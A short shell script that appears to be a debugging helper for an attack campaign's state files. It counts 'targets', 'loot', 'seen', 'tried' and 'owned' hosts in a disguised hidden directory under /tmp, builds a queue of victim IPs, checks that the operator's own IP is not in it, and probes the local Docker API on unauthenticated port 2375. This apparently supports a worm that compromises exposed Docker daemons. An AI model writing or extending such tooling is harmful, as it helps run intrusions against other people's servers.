#!/bin/sh
# throwaway: debug the dock.sh queue/state
W=/tmp/.sysd/.hunt
echo "targets=$(wc -l < "$W/targets.txt" 2>/dev/null) loot=$(wc -l < "$W/loot.txt" 2>/dev/null)"
echo "seen=$(wc -l < "$W/dock.seen") tried=$(wc -l < "$W/dock.tried") owned=$(wc -l < "$W/dock.owned")"
echo "self_in_seen=$(grep -c '167.233.74.146' "$W/dock.seen")"
echo "self_in_tried=$(grep -c '167.233.74.146' "$W/dock.tried")"
{
    cut -f3 "$W/targets.txt" 2>/dev/null
    cut -f3 "$W/loot.txt" 2>/dev/null
} | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | sort -u > /tmp/hh.txt
echo "queue=$(wc -l < /tmp/hh.txt)"
echo "self_in_queue=$(grep -c '^167.233.74.146$' /tmp/hh.txt)"
echo "first 6 queue hosts:"; head -6 /tmp/hh.txt
echo "tried sample:"; head -3 "$W/dock.tried"
echo "seen:"; cat "$W/dock.seen"
echo "daemon reachable: $(curl -s --max-time 4 http://127.0.0.1:2375/version | head -c 40)"
